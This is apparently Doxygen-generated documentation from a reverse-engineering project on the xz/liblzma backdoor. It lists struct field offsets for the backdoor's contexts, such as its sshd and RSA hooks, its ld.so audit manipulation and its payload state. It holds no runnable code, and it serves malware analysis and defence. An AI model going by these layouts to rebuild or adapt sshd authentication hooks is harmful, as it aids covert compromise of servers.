<tr class="memitem:acd3211fbfebb3eb22721d6f21d6a4b07"><td class="memItemLeft" align="right" valign="top"><a id="acd3211fbfebb3eb22721d6f21d6a4b07"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structsshd__ctx.html">sshd_ctx</a>, 0x20)</td></tr>
<tr class="separator:acd3211fbfebb3eb22721d6f21d6a4b07"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ab4e58064d52987443bcb600962b2b1"><td class="memItemLeft" align="right" valign="top"><a id="a6ab4e58064d52987443bcb600962b2b1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_sensitive_data, 0x28)</td></tr>
<tr class="separator:a6ab4e58064d52987443bcb600962b2b1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9eef1439c8b1df4b61e641523821427d"><td class="memItemLeft" align="right" valign="top"><a id="a9eef1439c8b1df4b61e641523821427d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structsshd__log__ctx.html">sshd_log_ctx</a>, 0x30)</td></tr>
<tr class="separator:a9eef1439c8b1df4b61e641523821427d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7a2c8fcb58d0fefec93f890d9eb0bb3e"><td class="memItemLeft" align="right" valign="top"><a id="a7a2c8fcb58d0fefec93f890d9eb0bb3e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, STR_ssh_rsa_cert_v01_openssh_com, 0x38)</td></tr>
<tr class="separator:a7a2c8fcb58d0fefec93f890d9eb0bb3e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7d8593863a42aa00da7cdfd87e1ebf1f"><td class="memItemLeft" align="right" valign="top"><a id="a7d8593863a42aa00da7cdfd87e1ebf1f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, STR_rsa_sha2_256, 0x40)</td></tr>
<tr class="separator:a7d8593863a42aa00da7cdfd87e1ebf1f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7efe9d222c85fd8ef99e976ce09557f3"><td class="memItemLeft" align="right" valign="top"><a id="a7efe9d222c85fd8ef99e976ce09557f3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, struct_monitor_ptr_address, 0x48)</td></tr>
<tr class="separator:a7efe9d222c85fd8ef99e976ce09557f3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6d8b5154aba07afc6d11af4d672c789d"><td class="memItemLeft" align="right" valign="top"><a id="a6d8b5154aba07afc6d11af4d672c789d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, exit_flag, 0x50)</td></tr>
<tr class="separator:a6d8b5154aba07afc6d11af4d672c789d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8466004e1c25fa00c7c1bc47a9b6c25f"><td class="memItemLeft" align="right" valign="top"><a id="a8466004e1c25fa00c7c1bc47a9b6c25f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structsshd__offsets.html">sshd_offsets</a>, 0x54)</td></tr>
<tr class="separator:a8466004e1c25fa00c7c1bc47a9b6c25f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af1e135dccb4a40a8ae6757f215eb3fc6"><td class="memItemLeft" align="right" valign="top"><a id="af1e135dccb4a40a8ae6757f215eb3fc6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_code_start, 0x58)</td></tr>
<tr class="separator:af1e135dccb4a40a8ae6757f215eb3fc6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a66c6c83693984a671934b3cffaf5bc7b"><td class="memItemLeft" align="right" valign="top"><a id="a66c6c83693984a671934b3cffaf5bc7b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_code_end, 0x60)</td></tr>
<tr class="separator:a66c6c83693984a671934b3cffaf5bc7b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0a3298d847f4396eb62a4f290d489afe"><td class="memItemLeft" align="right" valign="top"><a id="a0a3298d847f4396eb62a4f290d489afe"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_data_start, 0x68)</td></tr>
<tr class="separator:a0a3298d847f4396eb62a4f290d489afe"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad592c1dedd2cfba329ebeb5f76e72ec4"><td class="memItemLeft" align="right" valign="top"><a id="ad592c1dedd2cfba329ebeb5f76e72ec4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_data_end, 0x70)</td></tr>
<tr class="separator:ad592c1dedd2cfba329ebeb5f76e72ec4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2838327fdd0d46486c05e764fe368106"><td class="memItemLeft" align="right" valign="top"><a id="a2838327fdd0d46486c05e764fe368106"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, lzma_code_start, 0x80)</td></tr>
<tr class="separator:a2838327fdd0d46486c05e764fe368106"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4d010ee4a1c8e3f517e46abe02c82bd4"><td class="memItemLeft" align="right" valign="top"><a id="a4d010ee4a1c8e3f517e46abe02c82bd4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, lzma_code_end, 0x88)</td></tr>
<tr class="separator:a4d010ee4a1c8e3f517e46abe02c82bd4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa34293c84f87a55882ed62d7c180577d"><td class="memItemLeft" align="right" valign="top"><a id="aa34293c84f87a55882ed62d7c180577d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, uid, 0x90)</td></tr>
<tr class="separator:aa34293c84f87a55882ed62d7c180577d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8467d53e0fdeb05ac6fb1ec6c0bc2147"><td class="memItemLeft" align="right" valign="top"><a id="a8467d53e0fdeb05ac6fb1ec6c0bc2147"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sock_read_buf_size, 0x98)</td></tr>
<tr class="separator:a8467d53e0fdeb05ac6fb1ec6c0bc2147"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5d6db06cd243dd064aac77c4c362fc8f"><td class="memItemLeft" align="right" valign="top"><a id="a5d6db06cd243dd064aac77c4c362fc8f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sock_read_buf, 0xA0)</td></tr>
<tr class="separator:a5d6db06cd243dd064aac77c4c362fc8f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4a1567aaa2f6cbcde5e2baafb3b08e27"><td class="memItemLeft" align="right" valign="top"><a id="a4a1567aaa2f6cbcde5e2baafb3b08e27"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, payload_data_size, 0xE0)</td></tr>
<tr class="separator:a4a1567aaa2f6cbcde5e2baafb3b08e27"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adf63ca7b036b46dea388c7c527acfee6"><td class="memItemLeft" align="right" valign="top"><a id="adf63ca7b036b46dea388c7c527acfee6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, digest_offset, 0xE8)</td></tr>
<tr class="separator:adf63ca7b036b46dea388c7c527acfee6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a553efd43e73e5d92bd0d3030fc6c4c93"><td class="memItemLeft" align="right" valign="top"><a id="a553efd43e73e5d92bd0d3030fc6c4c93"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, payload_data, 0xF0)</td></tr>
<tr class="separator:a553efd43e73e5d92bd0d3030fc6c4c93"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae689a839956d4ac9c279a33bbcf04658"><td class="memItemLeft" align="right" valign="top"><a id="ae689a839956d4ac9c279a33bbcf04658"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structsshd__payload__ctx.html">sshd_payload_ctx</a>, 0xF8)</td></tr>
<tr class="separator:ae689a839956d4ac9c279a33bbcf04658"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0863abe3b5ca365a42db9a1d70756338"><td class="memItemLeft" align="right" valign="top"><a id="a0863abe3b5ca365a42db9a1d70756338"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_host_pubkey_idx, 0x100)</td></tr>
<tr class="separator:a0863abe3b5ca365a42db9a1d70756338"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae9c1588a96cfeb8c942214d6b3dea802"><td class="memItemLeft" align="right" valign="top"><a id="ae9c1588a96cfeb8c942214d6b3dea802"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, payload_state, 0x104)</td></tr>
<tr class="separator:ae9c1588a96cfeb8c942214d6b3dea802"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8f40ad493b38891682b414abc9b70a32"><td class="memItemLeft" align="right" valign="top"><a id="a8f40ad493b38891682b414abc9b70a32"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, secret_data, 0x108)</td></tr>
<tr class="separator:a8f40ad493b38891682b414abc9b70a32"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a376bd60de48e9143dd59f2cb1a121619"><td class="memItemLeft" align="right" valign="top"><a id="a376bd60de48e9143dd59f2cb1a121619"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, shift_operations, 0x141)</td></tr>
<tr class="separator:a376bd60de48e9143dd59f2cb1a121619"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a319519a1d5e7deeacdd65d0b31c9dc7d"><td class="memItemLeft" align="right" valign="top"><a id="a319519a1d5e7deeacdd65d0b31c9dc7d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, num_shifted_bits, 0x160)</td></tr>
<tr class="separator:a319519a1d5e7deeacdd65d0b31c9dc7d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aefbfc449066d0da7d2ab08aa103a2d23"><td class="memItemLeft" align="right" valign="top"><a id="aefbfc449066d0da7d2ab08aa103a2d23"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals_t</a>, <a class="el" href="xzre_8h.html#ace15703b7d962e9d6be778e4d8066f79">mm_answer_authpassword_hook</a>, 0x0)</td></tr>
<tr class="separator:aefbfc449066d0da7d2ab08aa103a2d23"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5ad79750f82beb4990af17e32e9cb445"><td class="memItemLeft" align="right" valign="top"><a id="a5ad79750f82beb4990af17e32e9cb445"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals_t</a>, hook_EVP_PKEY_set1_RSA, 0x8)</td></tr>
<tr class="separator:a5ad79750f82beb4990af17e32e9cb445"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a94c3fff16b704f8d529ce25798073af3"><td class="memItemLeft" align="right" valign="top"><a id="a94c3fff16b704f8d529ce25798073af3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals_t</a>, globals, 0x10)</td></tr>
<tr class="separator:a94c3fff16b704f8d529ce25798073af3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a60ebb9a8122e1ca3ff60a88a706bfc7a"><td class="memItemLeft" align="right" valign="top"><a id="a60ebb9a8122e1ca3ff60a88a706bfc7a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, libcrypto_auditstate_bindflags_ptr, 0x40)</td></tr>
<tr class="separator:a60ebb9a8122e1ca3ff60a88a706bfc7a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afb179047ab46ffd448fd0ac65b5514ad"><td class="memItemLeft" align="right" valign="top"><a id="afb179047ab46ffd448fd0ac65b5514ad"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, libcrypto_auditstate_bindflags_old_value, 0x48)</td></tr>
<tr class="separator:afb179047ab46ffd448fd0ac65b5514ad"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af9ef814c9f77301fbb4bddd2286650f7"><td class="memItemLeft" align="right" valign="top"><a id="af9ef814c9f77301fbb4bddd2286650f7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, sshd_auditstate_bindflags_ptr, 0x50)</td></tr>
<tr class="separator:af9ef814c9f77301fbb4bddd2286650f7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a35636e7e9dd56d5bb5d794beabcf3f76"><td class="memItemLeft" align="right" valign="top"><a id="a35636e7e9dd56d5bb5d794beabcf3f76"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, sshd_auditstate_bindflags_old_value, 0x58)</td></tr>
<tr class="separator:a35636e7e9dd56d5bb5d794beabcf3f76"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1e918ed678d91e80af8641b9bffb0ebd"><td class="memItemLeft" align="right" valign="top"><a id="a1e918ed678d91e80af8641b9bffb0ebd"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, sshd_link_map_l_audit_any_plt_addr, 0x60)</td></tr>
<tr class="separator:a1e918ed678d91e80af8641b9bffb0ebd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a62eb5a46823ef3365476a3e0532e3f65"><td class="memItemLeft" align="right" valign="top"><a id="a62eb5a46823ef3365476a3e0532e3f65"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, link_map_l_audit_any_plt_bitmask, 0x68)</td></tr>
<tr class="separator:a62eb5a46823ef3365476a3e0532e3f65"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a219f543b7020d21b9e9eb512576cef9e"><td class="memItemLeft" align="right" valign="top"><a id="a219f543b7020d21b9e9eb512576cef9e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, _dl_audit_ptr, 0x70)</td></tr>
<tr class="separator:a219f543b7020d21b9e9eb512576cef9e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a403c8e80ef6bc04f4c0ddf6746cdcc4d"><td class="memItemLeft" align="right" valign="top"><a id="a403c8e80ef6bc04f4c0ddf6746cdcc4d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, _dl_naudit_ptr, 0x78)</td></tr>
<tr class="separator:a403c8e80ef6bc04f4c0ddf6746cdcc4d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0c3515f1ed0cef7b21d990db6f2e7fee"><td class="memItemLeft" align="right" valign="top"><a id="a0c3515f1ed0cef7b21d990db6f2e7fee"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hooked_audit_ifaces, 0x80)</td></tr>
<tr class="separator:a0c3515f1ed0cef7b21d990db6f2e7fee"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4c728d421b6aa6bdf7dec59dd95ccb76"><td class="memItemLeft" align="right" valign="top"><a id="a4c728d421b6aa6bdf7dec59dd95ccb76"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, libcrypto_l_name, 0xF8)</td></tr>
<tr class="separator:a4c728d421b6aa6bdf7dec59dd95ccb76"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac0a88454c10f7b37078d956a0c4e5a8d"><td class="memItemLeft" align="right" valign="top"><a id="ac0a88454c10f7b37078d956a0c4e5a8d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, _dl_audit_symbind_alt, 0x100)</td></tr>
<tr class="separator:ac0a88454c10f7b37078d956a0c4e5a8d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a19c687b89a546054192f6416ac079890"><td class="memItemLeft" align="right" valign="top"><a id="a19c687b89a546054192f6416ac079890"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, _dl_audit_symbind_alt__size, 0x108)</td></tr>
<tr class="separator:a19c687b89a546054192f6416ac079890"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5ca5c4c3c86b75fe4665038d4e571fe7"><td class="memItemLeft" align="right" valign="top"><a id="a5ca5c4c3c86b75fe4665038d4e571fe7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hook_RSA_public_decrypt, 0x110)</td></tr>
<tr class="separator:a5ca5c4c3c86b75fe4665038d4e571fe7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a99de76b8a6318552cbc13b5204090642"><td class="memItemLeft" align="right" valign="top"><a id="a99de76b8a6318552cbc13b5204090642"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hook_EVP_PKEY_set1_RSA, 0x118)</td></tr>
<tr class="separator:a99de76b8a6318552cbc13b5204090642"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a535afe04cbca3cd6b6873cd8bf13b977"><td class="memItemLeft" align="right" valign="top"><a id="a535afe04cbca3cd6b6873cd8bf13b977"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hook_RSA_get0_key, 0x120)</td></tr>
<tr class="separator:a535afe04cbca3cd6b6873cd8bf13b977"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aac92a856eac31825a5c01b3960393485"><td class="memItemLeft" align="right" valign="top"><a id="aac92a856eac31825a5c01b3960393485"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, <a class="el" href="structimported__funcs.html">imported_funcs</a>, 0x128)</td></tr>
<tr class="separator:aac92a856eac31825a5c01b3960393485"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab832e987bb4d1ecb5c94d8c9f79dd07b"><td class="memItemLeft" align="right" valign="top"><a id="ab832e987bb4d1ecb5c94d8c9f79dd07b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hooks_installed, 0x130)</td></tr>
<tr class="separator:ab832e987bb4d1ecb5c94d8c9f79dd07b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae1ff944e55f1cadc57ed0c0bf4d2f231"><td class="memItemLeft" align="right" valign="top"><a id="ae1ff944e55f1cadc57ed0c0bf4d2f231"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, <a class="el" href="structldso__ctx.html">ldso_ctx</a>, 0)</td></tr>
<tr class="separator:ae1ff944e55f1cadc57ed0c0bf4d2f231"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7e22d7ecbc0b7ebd31dac291b2e7ec26"><td class="memItemLeft" align="right" valign="top"><a id="a7e22d7ecbc0b7ebd31dac291b2e7ec26"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, global_ctx, 0x138)</td></tr>
<tr class="separator:a7e22d7ecbc0b7ebd31dac291b2e7ec26"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afff0285496688cc297ddc763d1659248"><td class="memItemLeft" align="right" valign="top"><a id="afff0285496688cc297ddc763d1659248"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, <a class="el" href="structimported__funcs.html">imported_funcs</a>, 0x2A0)</td></tr>
<tr class="separator:afff0285496688cc297ddc763d1659248"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a99dd26ad23314db2ad11ecfe78043a4a"><td class="memItemLeft" align="right" valign="top"><a id="a99dd26ad23314db2ad11ecfe78043a4a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, <a class="el" href="structsshd__ctx.html">sshd_ctx</a>, 0x3C8)</td></tr>
<tr class="separator:a99dd26ad23314db2ad11ecfe78043a4a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4fdb47fcbb89cffb9043d5606afa0325"><td class="memItemLeft" align="right" valign="top"><a id="a4fdb47fcbb89cffb9043d5606afa0325"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, <a class="el" href="structlibc__imports.html">libc_imports</a>, 0x4A8)</td></tr>
<tr class="separator:a4fdb47fcbb89cffb9043d5606afa0325"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af8b1947f1c0debb4d765188703313074"><td class="memItemLeft" align="right" valign="top"><a id="af8b1947f1c0debb4d765188703313074"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, <a class="el" href="structsshd__log__ctx.html">sshd_log_ctx</a>, 0x518)</td></tr>
<tr class="separator:af8b1947f1c0debb4d765188703313074"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acd706b3900336d8871c3786ad3d42a5f"><td class="memItemLeft" align="right" valign="top"><a id="acd706b3900336d8871c3786ad3d42a5f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, signed_data_size, 0x580)</td></tr>
<tr class="separator:acd706b3900336d8871c3786ad3d42a5f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a82054ef46da2d313f4995ff39ca24d39"><td class="memItemLeft" align="right" valign="top"><a id="a82054ef46da2d313f4995ff39ca24d39"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, signed_data, 0x588)</td></tr>
<tr class="separator:a82054ef46da2d313f4995ff39ca24d39"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a48a342782dc3da5956f0bce32b6d71a2"><td class="memItemLeft" align="right" valign="top"><a id="a48a342782dc3da5956f0bce32b6d71a2"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, shared, 0x30)</td></tr>
<tr class="separator:a48a342782dc3da5956f0bce32b6d71a2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a25254cc6d73666c4b52a2146a09071ba"><td class="memItemLeft" align="right" valign="top"><a id="a25254cc6d73666c4b52a2146a09071ba"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, <a class="el" href="xzre_8h.html#a32c97a88bc607d3f2459f0d7d420099d">hooks_data_addr</a>, 0x38)</td></tr>
<tr class="separator:a25254cc6d73666c4b52a2146a09071ba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af429ab9adae492354cb7959e8a0e0bba"><td class="memItemLeft" align="right" valign="top"><a id="af429ab9adae492354cb7959e8a0e0bba"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, symbind64, 0x40)</td></tr>
<tr class="separator:af429ab9adae492354cb7959e8a0e0bba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a241474d2ed6902e60c42ce50cdba2a78"><td class="memItemLeft" align="right" valign="top"><a id="a241474d2ed6902e60c42ce50cdba2a78"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, hook_RSA_public_decrypt, 0x48)</td></tr>
<tr class="separator:a241474d2ed6902e60c42ce50cdba2a78"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ada9d6e7410ac46d52cd7da32b816d40c"><td class="memItemLeft" align="right" valign="top"><a id="ada9d6e7410ac46d52cd7da32b816d40c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, hook_RSA_get0_key, 0x50)</td></tr>
<tr class="separator:ada9d6e7410ac46d52cd7da32b816d40c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a416d22351b85b59792c982eed4bb7ac1"><td class="memItemLeft" align="right" valign="top"><a id="a416d22351b85b59792c982eed4bb7ac1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, mm_log_handler, 0x58)</td></tr>
<tr class="separator:a416d22351b85b59792c982eed4bb7ac1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a82c420adfd4796794d37f883e6d4b5a8"><td class="memItemLeft" align="right" valign="top"><a id="a82c420adfd4796794d37f883e6d4b5a8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, mm_answer_keyallowed, 0x70)</td></tr>
<tr class="separator:a82c420adfd4796794d37f883e6d4b5a8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af055cd69bee66618dc6463be82811aca"><td class="memItemLeft" align="right" valign="top"><a id="af055cd69bee66618dc6463be82811aca"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, mm_answer_keyverify, 0x78)</td></tr>
<tr class="separator:af055cd69bee66618dc6463be82811aca"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0b25e68f96fef005e33fd1f93f1cce3d"><td class="memItemLeft" align="right" valign="top"><a id="a0b25e68f96fef005e33fd1f93f1cce3d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a>, shared, 0x8)</td></tr>
<tr class="separator:a0b25e68f96fef005e33fd1f93f1cce3d"><td class="memSeparator" colspan="2">&#160;</td></tr>
